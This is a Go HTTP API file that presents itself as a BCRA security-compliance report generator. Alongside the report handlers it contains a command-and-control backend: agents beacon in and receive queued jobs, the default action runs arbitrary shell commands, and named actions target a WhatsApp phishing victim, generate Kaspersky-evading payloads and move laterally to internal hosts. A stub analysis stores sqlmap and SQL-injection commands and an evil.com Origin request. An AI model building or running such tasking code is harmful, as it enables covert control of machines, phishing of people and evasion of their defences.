package api

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/bishopfox/sliver/server/modules/reporting"
	"github.com/bishopfox/sliver/server/modules/reporting/storage"
	"github.com/gin-gonic/gin"
)

const ReportStoragePath = "/tmp/pampero-reports"

type GenerateReportRequest struct {
	InstitutionName     string                      `json:"institution_name" binding:"required"`
	InstitutionType     string                      `json:"institution_type"`
	InstitutionAddress  string                      `json:"institution_address"`
	AssessmentPeriod    string                      `json:"assessment_period"`
	AssessmentTeam      string                      `json:"assessment_team"`
	AssessmentTeamEmail string                      `json:"assessment_team_email"`
	ExecutiveSummary    string                      `json:"executive_summary"`
	OverallRiskLevel    string                      `json:"overall_risk_level"`
	ComplianceStatus    string                      `json:"compliance_status"`
	MethodologyUsed     string                      `json:"methodology_used"`
	ControlsAssessed    int                         `json:"controls_assessed"`
	Findings            []reporting.Finding         `json:"findings"`
	RiskMatrix          []reporting.RiskItem        `json:"risk_matrix"`
	Remediations        []reporting.RemediationItem `json:"remediations"`
}

type ReportResponse struct {
	ID            string    `json:"id"`
	ReportID      string    `json:"report_id"`
	Institution   string    `json:"institution"`
	RiskLevel     string    `json:"risk_level"`
	FindingsCount int       `json:"findings_count"`
	Critical      int       `json:"critical"`
	High          int       `json:"high"`
	Medium        int       `json:"medium"`
	Low           int       `json:"low"`
	CreatedAt     time.Time `json:"created_at"`
	PDFPath       string    `json:"pdf_path"`
}

func GenerateReport(c *gin.Context) {
	var req GenerateReportRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	bcraReport := &reporting.BCRAReport{
		ReportID:            fmt.Sprintf("BCRA-%d-%s", time.Now().Unix(), time.Now().Format("20060102")),
		InstitutionName:     req.InstitutionName,
		InstitutionType:     req.InstitutionType,
		InstitutionAddress:  req.InstitutionAddress,
		AssessmentPeriod:    req.AssessmentPeriod,
		AssessmentTeam:      req.AssessmentTeam,
		AssessmentTeamEmail: req.AssessmentTeamEmail,
		ReportDate:          time.Now(),
		ReportValidUntil:    time.Now().AddDate(0, 0, 365),
		ExecutiveSummary:    req.ExecutiveSummary,
		OverallRiskLevel:    req.OverallRiskLevel,
		ComplianceStatus:    req.ComplianceStatus,
		MethodologyUsed:     req.MethodologyUsed,
		ControlsAssessed:    req.ControlsAssessed,
		Findings:            req.Findings,
		RiskMatrix:          req.RiskMatrix,
		Remediations:        req.Remediations,
	}
	bcraReport.CalculateStats()
	bcraReport.CalculateRiskScores()
	pdfBytes, err := reporting.GenerateBCRAReport(bcraReport)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("error generando PDF: %v", err)})
		return
	}
	os.MkdirAll(ReportStoragePath, 0755)
	pdfFilename := fmt.Sprintf("%s/reporte_%s.pdf", ReportStoragePath, bcraReport.ReportID)
	err = ioutil.WriteFile(pdfFilename, pdfBytes, 0644)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("error guardando PDF: %v", err)})
		return
	}
	stored, err := storage.SaveReport(bcraReport, pdfFilename)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("error guardando en BD: %v", err)})
		return
	}
	resp := ReportResponse{
		ID:            stored.ID,
		ReportID:      bcraReport.ReportID,
		Institution:   bcraReport.InstitutionName,
		RiskLevel:     bcraReport.OverallRiskLevel,
		FindingsCount: len(bcraReport.Findings),
		Critical:      bcraReport.CriticalFindings,
		High:          bcraReport.HighFindings,
		Medium:        bcraReport.MediumFindings,
		Low:           bcraReport.LowFindings,
		CreatedAt:     time.Now(),
		PDFPath:       pdfFilename,
	}
	c.JSON(http.StatusOK, resp)
}

func ListReports(c *gin.Context) {
	page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
	pageSize, _ := strconv.Atoi(c.DefaultQuery("page_size", "10"))
	reports, total, err := storage.ListReports(page, pageSize)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	respReports := make([]map[string]interface{}, len(reports))
	for i, r := range reports {
		respReports[i] = map[string]interface{}{
			"id":               r.ID,
			"report_id":        r.ReportID,
			"institution":      r.InstitutionName,
			"institution_type": r.InstitutionType,
			"risk_level":       r.OverallRiskLevel,
			"critical":         r.CriticalFindings,
			"high":             r.HighFindings,
			"medium":           r.MediumFindings,
			"low":              r.LowFindings,
			"findings_count":   r.FindingsCount,
			"created_at":       r.CreatedAt,
			"assessment_team":  r.AssessmentTeam,
		}
	}
	c.JSON(http.StatusOK, gin.H{
		"data":      respReports,
		"total":     total,
		"page":      page,
		"page_size": pageSize,
	})
}

func GetReport(c *gin.Context) {
	reportID := c.Param("id")
	report, err := storage.GetReport(reportID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "reporte no encontrado"})
		return
	}
	c.JSON(http.StatusOK, report)
}

func DownloadReport(c *gin.Context) {
	reportID := c.Param("id")
	report, err := storage.GetReport(reportID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "reporte no encontrado"})
		return
	}
	if _, err := os.Stat(report.PDFPath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "archivo PDF no encontrado"})
		return
	}
	filename := filepath.Base(report.PDFPath)
	c.Header("Content-Type", "application/pdf")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
	c.File(report.PDFPath)
}

func DeleteReport(c *gin.Context) {
	reportID := c.Param("id")
	report, err := storage.GetReport(reportID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "reporte no encontrado"})
		return
	}
	if err := os.Remove(report.PDFPath); err != nil && !os.IsNotExist(err) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("error eliminando PDF: %v", err)})
		return
	}
	if err := storage.DeleteReport(reportID); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("error eliminando de BD: %v", err)})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "reporte eliminado"})
}

type AgentBeaconRequest struct {
	AgentID       string            `json:"agent_id" binding:"required"`
	Hostname      string            `json:"hostname" binding:"required"`
	Username      string            `json:"username"`
	OS            string            `json:"os"`
	Arch          string            `json:"arch"`
	BeaconHeaders map[string]string `json:"beacon_headers"`
	Tags          []string          `json:"tags"`
	Zone          string            `json:"zone"`
	Profile       string            `json:"profile"`
	Status        string            `json:"status"`
}

type AgentJobRequest struct {
	Command    string   `json:"command" binding:"required"`
	Args       []string `json:"args"`
	TimeoutSec int      `json:"timeout_sec"`
}

type AgentJobResultRequest struct {
	ExitCode int    `json:"exit_code"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
}

type AgentActionRequest struct {
	Action string            `json:"action" binding:"required"`
	Params map[string]string `json:"params"`
}

func GetStatistics(c *gin.Context) {
	stats, err := storage.GetStatistics()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, stats)
}

func BeaconAgent(c *gin.Context) {
	var req AgentBeaconRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	agent := &reporting.Agent{
		AgentID:       req.AgentID,
		Hostname:      req.Hostname,
		Username:      req.Username,
		OS:            req.OS,
		Arch:          req.Arch,
		BeaconHeaders: req.BeaconHeaders,
		Status:        req.Status,
		Tags:          req.Tags,
		Zone:          req.Zone,
		Profile:       req.Profile,
		BeaconCount:   1,
		LastSeen:      time.Now(),
	}

	stored, err := storage.SaveAgent(agent)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	jobs, _ := storage.GetPendingJobs(stored.AgentID)

	c.JSON(http.StatusOK, gin.H{"status": "ok", "pending_jobs": jobs})
}

func ListAgents(c *gin.Context) {
	agents, err := storage.ListAgents()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"agents": agents})
}

func GetAgent(c *gin.Context) {
	agentID := c.Param("id")
	agent, err := storage.GetAgent(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	c.JSON(http.StatusOK, agent)
}

func ExecuteAgentAction(c *gin.Context) {
	agentID := c.Param("id")
	var req AgentActionRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	_, err := storage.GetAgent(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	command, args := mapAgentActionToCommand(req.Action, req.Params)
	job := &reporting.AgentJob{
		AgentID:    agentID,
		Command:    command,
		Args:       args,
		TimeoutSec: 900,
	}

	stored, err := storage.SaveJob(job)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"job": stored})
}

func mapAgentActionToCommand(action string, params map[string]string) (string, []string) {
	switch action {
	case "phish-whatsapp":
		victim := params["target"]
		if victim == "" {
			victim = "+5491123456789"
		}
		return "phish-whatsapp", []string{victim}
	case "generate-evasion-kaspersky":
		return "generate", []string{"--evasion", "kaspersky"}
	case "recon-auto":
		return "recon", []string{"--auto"}
	case "lateral-move":
		target := params["target"]
		if target == "" {
			target = "10.0.0.55"
		}
		return "lateral-move", []string{target}
	default:
		// ejecucion de shell arbitraria
		shell := params["cmd"]
		if shell == "" {
			shell = action
		}
		return shell, nil
	}
}

func CreateAgentJob(c *gin.Context) {
	agentID := c.Param("id")
	var req AgentJobRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if _, err := storage.GetAgent(agentID); err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	job := &reporting.AgentJob{
		AgentID:    agentID,
		Command:    req.Command,
		Args:       req.Args,
		TimeoutSec: req.TimeoutSec,
	}
	stored, err := storage.SaveJob(job)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, stored)
}

func ListAgentJobs(c *gin.Context) {
	agentID := c.Param("id")
	jobs, err := storage.GetPendingJobs(agentID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"jobs": jobs})
}

func SubmitJobResult(c *gin.Context) {
	jobID := c.Param("id")
	var req AgentJobResultRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	job := &reporting.AgentJobResult{
		JobID:    jobID,
		AgentID:  c.Query("agent_id"),
		ExitCode: req.ExitCode,
		Stdout:   req.Stdout,
		Stderr:   req.Stderr,
	}

	storedResult, err := storage.SaveJobResult(job)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if err := storage.UpdateJobStatus(jobID, "done", storedResult.ID); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	// Loop for BCRA event embedding (starting point)
	// TODO: map job output to report findings insights

	c.JSON(http.StatusOK, gin.H{"result": storedResult})
}

func GetJobResults(c *gin.Context) {
	jobID := c.Param("id")
	results, err := storage.GetJobResults(jobID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"results": results})
}

func Health(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": "ok", "timestamp": time.Now()})
}
func GetAIAnalysis(c *gin.Context) {
	reportID := c.Param("id")

	aiAnalysis, err := storage.GetAIAnalysis(reportID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "análisis IA no encontrado"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"ai_analysis": aiAnalysis})
}

func ReanalyzeReport(c *gin.Context) {
	reportID := c.Param("id")

	// Verificar que el reporte existe
	_, err := storage.GetReport(reportID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "reporte no encontrado"})
		return
	}

	// Crear análisis de prueba (simplificado)
	aiAnalysis := []reporting.AIAnalysisItem{
		{
			FindingID:         "1",
			AIEnrichment:      "Análisis generado por IA: Se recomienda implementar validación de entrada y usar prepared statements",
			AttackVectors:     []string{"SQL Injection", "Blind SQL Injection"},
			TechnicalCommands: []string{"sqlmap -u 'http://target.com/login' --data='user=admin&pass=pass'", "python -c 'import requests; requests.post(url, data={\"user\":\"admin' OR '1'='1\",\"pass\":\"\"})'"},
			Priority:          "alta",
			Confidence:        0.85,
		},
		{
			FindingID:         "2",
			AIEnrichment:      "Análisis generado por IA: Configuración CORS insegura permite potenciales ataques de cross-origin",
			AttackVectors:     []string{"Cross-Origin Request Forgery", "Data Exfiltration"},
			TechnicalCommands: []string{"curl -H 'Origin: http://evil.com' http://target.com/api/data", "python -c 'import requests; requests.get(url, headers={\"Origin\":\"http://evil.com\"})'"},
			Priority:          "media",
			Confidence:        0.75,
		},
	}

	// Guardar el análisis
	if err := storage.SaveAIAnalysis(reportID, aiAnalysis); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "error guardando análisis IA"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"ai_analysis": aiAnalysis})
}
